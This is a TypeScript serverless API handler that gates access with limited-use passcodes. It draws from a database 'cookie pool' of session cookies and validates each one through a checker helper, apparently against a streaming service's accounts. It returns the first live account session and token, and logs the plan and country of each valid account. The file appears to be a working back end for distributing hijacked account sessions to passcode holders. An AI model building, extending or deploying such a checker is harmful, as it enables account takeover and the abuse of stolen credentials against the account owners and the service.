import type { VercelRequest, VercelResponse } from "@vercel/node";
import { ipRateLimit } from "../lib/rateLimit.js";
import { isLockedOut, recordFailure, clearFailures } from "../lib/antiBruteforce.js";
import { createClient } from "@supabase/supabase-js";
import { createRequire } from "module";

function getClientIp(req: VercelRequest) {
  const xff = req.headers["x-forwarded-for"];
  if (typeof xff === "string" && xff.length > 0) {
    return xff.split(",")[0].trim();
  }

  const realIp = req.headers["x-real-ip"];
  if (typeof realIp === "string" && realIp.length > 0) {
    return realIp;
  }

  return "unknown";
}

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,
  {
    auth: {
      persistSession: false,
      autoRefreshToken: false,
    },
  }
);

const require = createRequire(import.meta.url);
const originalServerHelpers = require("./original_server_helpers.cjs");

const { getCookieHeaders, runDirectCheck } =
  originalServerHelpers.default ?? originalServerHelpers;

async function isPasscodeValid(passcode: string) {
  const { data, error } = await supabase
    .from("passcodes")
    .select("id, code, is_active, expires_at, uses, max_uses")
    .eq("code", passcode)
    .eq("is_active", true)
    .maybeSingle();

  if (error) throw new Error(error.message);
  if (!data) return { ok: false, error: "Incorrect passcode." };

  if (data.expires_at && new Date(data.expires_at) <= new Date()) {
    return { ok: false, error: "This passcode has expired." };
  }

  if (
    typeof data.max_uses === "number" &&
    typeof data.uses === "number" &&
    data.uses >= data.max_uses
  ) {
    return { ok: false, error: "Usage limit reached." };
  }

  return { ok: true, passcodeRow: data };
}

async function incrementPasscodeUsage(passcodeId: string, currentUses: number | null) {
  const { error } = await supabase
    .from("passcodes")
    .update({ uses: (currentUses ?? 0) + 1 })
    .eq("id", passcodeId);

  if (error) {
    console.error("incrementPasscodeUsage error:", error.message);
  }
}

async function savePassedCheckAudits(results: any[]) {
  const passed = (results || []).filter((r) => r?.valid);
  if (!passed.length) return;

  const rows = passed.map((item) => ({
    plan: item.plan || null,
    country: item.countryOfSignup || null,
    checked_at: new Date().toISOString(),
  }));

  const { error } = await supabase.from("live_checks").insert(rows);

  if (error) {
    console.error("savePassedCheckAudits error:", error.message);
  }
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  try {
    const ip = getClientIp(req);

    const { success } = await ipRateLimit.limit(ip);
    if (!success) {
      return res.status(429).json({
        success: false,
        error: "Too many requests. Try again later.",
      });
    }

    const locked = await isLockedOut(ip);
    if (locked) {
      return res.status(429).json({
        success: false,
        error: "Too many failed attempts. Try again later.",
      });
    }

    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        error: "Method not allowed",
      });
    }

    const passcode = String(req.body?.passcode ?? "").trim();

    if (!passcode) {
      await recordFailure(ip);
      return res.status(400).json({
        success: false,
        error: "Passcode is required.",
      });
    }

    const passcodeCheck = await isPasscodeValid(passcode);
    if (!passcodeCheck.ok) {
      await recordFailure(ip);
      return res.status(401).json({
        success: false,
        error: passcodeCheck.error,
      });
    }

    const { data: cookieRows, error: cookieError } = await supabase
      .from("cookies")
      .select("cookie")
      .order("created_at", { ascending: false });

    if (cookieError) {
      return res.status(500).json({
        success: false,
        error: cookieError.message,
      });
    }

    const storedCookies = (cookieRows ?? [])
      .map((row: any) => row.cookie)
      .filter(Boolean);

    if (!storedCookies.length) {
      return res.status(400).json({
        success: false,
        error: "Cookie pool is empty. No cookies available yet.",
      });
    }

    const parsedInput = getCookieHeaders({
      input: storedCookies.join("\n"),
    });

    if (parsedInput.error) {
      return res.status(400).json({
        success: false,
        error: parsedInput.error,
      });
    }

    const cookies = parsedInput.cookies;
    if (!Array.isArray(cookies) || !cookies.length) {
      return res.status(400).json({
        success: false,
        error: "No valid cookies found in the pool.",
      });
    }

    for (let i = cookies.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [cookies[i], cookies[j]] = [cookies[j], cookies[i]];
    }

    for (const cookie of cookies) {
      const result = await runDirectCheck([cookie], 1, {
        skipNFToken: false,
        delayMs: 0,
        randomJitter: false,
        staggerMs: 0,
        onValidCookie: async () => {},
      });

      const results = Array.isArray(result?.results) ? result.results : [];

      await savePassedCheckAudits(results);

      const valid = results.find(
  (r: any) =>
    r?.valid &&
    (r.nftoken || r.nfToken || r.token)
);

      if (valid) {
        await incrementPasscodeUsage(
          passcodeCheck.passcodeRow.id,
          passcodeCheck.passcodeRow.uses ?? 0
        );

        await clearFailures(ip);

        return res.status(200).json({
  success: true,
  results: [valid] // 🔥 ONLY return the good one
});
      }
    }

    return res.status(404).json({
      success: false,
      error: "No valid account found from available cookies.",
    });
  } catch (error: any) {
    console.error("find-account crash:", error);
    return res.status(500).json({
      success: false,
      error: error?.message || "Unexpected server error",
    });
  }
}
